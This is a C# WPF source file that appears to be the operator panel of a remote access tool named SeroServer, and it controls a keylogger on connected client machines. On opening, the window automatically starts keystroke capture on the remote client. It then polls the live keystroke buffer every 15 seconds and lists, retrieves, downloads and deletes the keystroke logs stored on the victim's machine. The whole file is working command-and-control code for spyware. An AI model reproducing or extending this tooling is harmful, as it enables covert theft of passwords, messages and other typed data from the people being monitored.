using System.IO;
using System.Windows;
using System.Windows.Input;
using System.Windows.Threading;
using DevExpress.Xpf.Core;
using Newtonsoft.Json;
using SeroServer.Net;
using SeroServer.Protocol;

namespace SeroServer.UI;

public partial class KeyloggerWindow : ThemedWindow
{
    private readonly TlsServer _server;
    private readonly string    _clientId;
    private bool               _capturing;
    private string             _currentFilename = "";
    private readonly DispatcherTimer _autoRefresh = new() { Interval = TimeSpan.FromSeconds(15) };

    public KeyloggerWindow(TlsServer server, string clientId, string clientLabel)
    {
        InitializeComponent();
        _server   = server;
        _clientId = clientId;
        TxtTitle.Text = clientLabel;

        _server.RegisterHandler(clientId, PacketType.KeyloggerLogsResult,  OnLogsResult);
        _server.RegisterHandler(clientId, PacketType.KeyloggerFilesResult, OnFilesResult);
        _server.RegisterHandler(clientId, PacketType.KeyloggerFileContent, OnFileContent);

        _autoRefresh.Tick += (_, _) => { if (_capturing) RequestLogs(); };
        Lang.LanguageChanged += ApplyLanguage;
        ApplyLanguage();
        Closed += (_, _) =>
        {
            _autoRefresh.Stop();
            _server.UnregisterHandler(clientId, PacketType.KeyloggerLogsResult);
            _server.UnregisterHandler(clientId, PacketType.KeyloggerFilesResult);
            _server.UnregisterHandler(clientId, PacketType.KeyloggerFileContent);
            Lang.LanguageChanged -= ApplyLanguage;
            ServerWindow.ReportGlobalActivity("Keylogger stopped", _clientId, "complete");
            ServerWindow.LogGlobal($"[KEYLOG] Keylogger stopped for client {_clientId}.");
        };

        // Auto-start capturing on open + immediately fetch live buffer + file list
        Loaded += async (_, _) =>
        {
            await Task.Delay(Random.Shared.Next(0, 250));
            await _server.SendToClient(_clientId, new Packet { Type = PacketType.KeyloggerStart });
            _capturing = true; UpdateBadge(); _autoRefresh.Start();
            await _server.SendToClient(_clientId, new Packet { Type = PacketType.KeyloggerGetLogs });
            await _server.SendToClient(_clientId, new Packet { Type = PacketType.KeyloggerListFiles });
            ServerWindow.ReportGlobalActivity("Keylogger started", _clientId, "complete");
            ServerWindow.LogGlobal($"[KEYLOG] Keylogger started for client {_clientId}.");
        };
    }

    private void ApplyLanguage()
    {
        this.Title = Lang.Get("FEAT_KEYLOGGER");
        if (TxtBtnActions   != null) TxtBtnActions.Text   = Lang.Get("ACT_ACTIONS");
        if (TxtBtnKlRefresh != null) TxtBtnKlRefresh.Text = Lang.Get("ACT_REFRESH");
        if (MnuKlDownload   != null) MnuKlDownload.Header = Lang.Get("ACT_DOWNLOAD");
        if (MnuKlDelete     != null) MnuKlDelete.Header   = Lang.Get("ACT_DELETE");
        if (MnuKlCopyName   != null) MnuKlCopyName.Header = Lang.Get("ACT_COPY_NAME");
        if (MnuKlRefresh    != null) MnuKlRefresh.Header  = Lang.Get("ACT_REFRESH");
        if (BtnDownloadFile != null) BtnDownloadFile.Content = Lang.Get("ACT_DOWNLOAD");
        if (BtnDeleteFile   != null) BtnDeleteFile.Content   = Lang.Get("ACT_DELETE");
        if (TxtViewerTitle  != null && TxtViewerTitle.Text == "Select a log file to view")
            TxtViewerTitle.Text = Lang.Get("KL_SELECT_FILE");
    }

    // ── Outgoing ────────────────────────────────────────────────────────────

    private async void RequestLogs()
    {
        await _server.SendToClient(_clientId, new Packet { Type = PacketType.KeyloggerGetLogs });
    }

    private async void RequestFileList()
    {
        await _server.SendToClient(_clientId, new Packet { Type = PacketType.KeyloggerListFiles });
        TxtStatus.Text = Lang.Get("STATUS_REFRESHING");
    }

    // ── Incoming ────────────────────────────────────────────────────────────

    private void OnLogsResult(Packet pkt)
    {
        var data = JsonConvert.DeserializeObject<KeyloggerLogsResultData>(pkt.Data);
        if (data == null) return;
        if (Dispatcher.HasShutdownStarted || Dispatcher.HasShutdownFinished) return;
        Dispatcher.BeginInvoke(() =>
        {
            _capturing = data.IsRunning;
            UpdateBadge();
            if (!string.IsNullOrEmpty(data.Logs))
            {
                NotificationService.NotifyKeylogReceived();
                TxtLog.AppendText(data.Logs);
                if (TxtLog.Text.Length > 50000)
                    TxtLog.Text = TxtLog.Text[^50000..];
                TxtLog.ScrollToEnd();
                TxtViewerTitle.Text = $"Live buffer — {(_capturing ? "ON" : "OFF")}";
            }
            TxtStatus.Text = _capturing ? Lang.Get("KL_CAPTURING") : Lang.Get("STOPPED");
        });
    }

    private void OnFilesResult(Packet pkt)
    {
        var data = JsonConvert.DeserializeObject<KeyloggerFilesResultData>(pkt.Data);
        if (data == null) return;
        if (Dispatcher.HasShutdownStarted || Dispatcher.HasShutdownFinished) return;
        Dispatcher.BeginInvoke(() =>
        {
            _capturing = data.IsRunning;
            UpdateBadge();

            ListFiles.Items.Clear();
            foreach (var f in data.Files)
                ListFiles.Items.Add(new LogFileVM(f.Filename, f.Size));

            TxtStatus.Text = string.Format(Lang.Get("KL_STATUS"), data.Files.Count, _capturing ? Lang.Get("KL_YES") : Lang.Get("KL_NO"));
        });
    }

    private void OnFileContent(Packet pkt)
    {
        var data = JsonConvert.DeserializeObject<KeyloggerFileContentData>(pkt.Data);
        if (data == null) return;
        if (Dispatcher.HasShutdownStarted || Dispatcher.HasShutdownFinished) return;
        Dispatcher.BeginInvoke(() =>
        {
            TxtLog.Text = data.Content;
            TxtViewerTitle.Text = data.Filename;
            TxtLog.ScrollToEnd();
            TxtStatus.Text = string.Format(Lang.Get("KL_LOADED"), data.Filename, data.Content.Length.ToString("N0"));
        });
    }

    // ── Button handlers ──────────────────────────────────────────────────────

    private void BtnRefresh_Click(object s, RoutedEventArgs e) => RequestFileList();

    private void ListFiles_CopyName_Click(object s, RoutedEventArgs e)
    {
        if (ListFiles.SelectedItem is not LogFileVM vm) return;
        try { System.Windows.Clipboard.SetText(vm.Filename); } catch { }
        TxtStatus.Text = string.Format(Lang.Get("COPIED"), vm.Filename);
    }

    private async void ListFiles_SelectionChanged(object s, System.Windows.Controls.SelectionChangedEventArgs e)
    {
        if (ListFiles.SelectedItem is not LogFileVM vm) return;
        _currentFilename = vm.Filename;
        await _server.SendToClient(_clientId, new Packet
        {
            Type = PacketType.KeyloggerGetFile,
            Data = JsonConvert.SerializeObject(new KeyloggerGetFileData { Filename = vm.Filename })
        });
        TxtStatus.Text = string.Format(Lang.Get("KL_LOADING"), vm.Filename);
    }

    private async void BtnDelete_Click(object s, RoutedEventArgs e)
    {
        if (ListFiles.SelectedItem is not LogFileVM vm) return;
        if (MessageBox.Show(string.Format(Lang.Get("KL_DELETE_CONFIRM"), vm.Filename), Lang.Get("MSG_CONFIRM"),
            MessageBoxButton.YesNo, MessageBoxImage.Warning) != MessageBoxResult.Yes) return;

        await _server.SendToClient(_clientId, new Packet
        {
            Type = PacketType.KeyloggerDeleteFile,
            Data = JsonConvert.SerializeObject(new KeyloggerGetFileData { Filename = vm.Filename })
        });
        ServerWindow.ReportGlobalActivity("Delete keylog", vm.Filename, "complete");
        ServerWindow.LogGlobal($"[KEYLOG] Deleted log file '{vm.Filename}' on client {_clientId}.");
        await Task.Delay(400);
        RequestFileList();
        TxtLog.Clear();
        TxtViewerTitle.Text = Lang.Get("KL_SELECT_FILE");
    }

    private void BtnDownload_Click(object s, RoutedEventArgs e)
    {
        if (string.IsNullOrEmpty(TxtLog.Text) || string.IsNullOrEmpty(_currentFilename))
        { TxtStatus.Text = Lang.Get("KL_NOTHING_TO_DL"); return; }

        var dlg = new Microsoft.Win32.SaveFileDialog
        {
            Filter   = "Text Files (*.txt)|*.txt",
            FileName = _currentFilename
        };
        if (dlg.ShowDialog() != true) return;
        File.WriteAllText(dlg.FileName, TxtLog.Text, System.Text.Encoding.UTF8);
        TxtStatus.Text = string.Format(Lang.Get("SAVED"), dlg.FileName);
    }

    private void BtnSave_Click(object s, RoutedEventArgs e) => BtnDownload_Click(s, e);

    private void UpdateBadge()
        => BadgeRunning.Visibility = _capturing ? Visibility.Visible : Visibility.Collapsed;

    private void Close_Click(object s, RoutedEventArgs e) => Close();

    private void ListFiles_ContextMenuOpening(object sender, System.Windows.Controls.ContextMenuEventArgs e)
    {
        if (ListFiles.SelectedItem == null) e.Handled = true;
    }

    private void BtnMenu_Click(object sender, RoutedEventArgs e)
    {
        if (sender is not System.Windows.Controls.Button btn) return;
        var mainWindow = System.Windows.Application.Current.Windows.OfType<ServerWindow>().FirstOrDefault();
        if (mainWindow == null) return;
        var menu = FeatureContextMenu.Build(_server, _clientId, mainWindow, "KeyloggerWindow");
        btn.ContextMenu = menu;
        menu.PlacementTarget = btn;
        menu.Placement = System.Windows.Controls.Primitives.PlacementMode.Bottom;
        menu.IsOpen = true;
    }
}

public class LogFileVM
{
    public string Filename    { get; }
    public string DateDisplay { get; }
    public string SizeDisplay { get; }

    public LogFileVM(string filename, long size)
    {
        Filename    = filename;
        DateDisplay = System.IO.Path.GetFileNameWithoutExtension(filename);
        SizeDisplay = size < 1024 ? $"{size} B" : $"{size / 1024.0:F1} KB";
    }
}
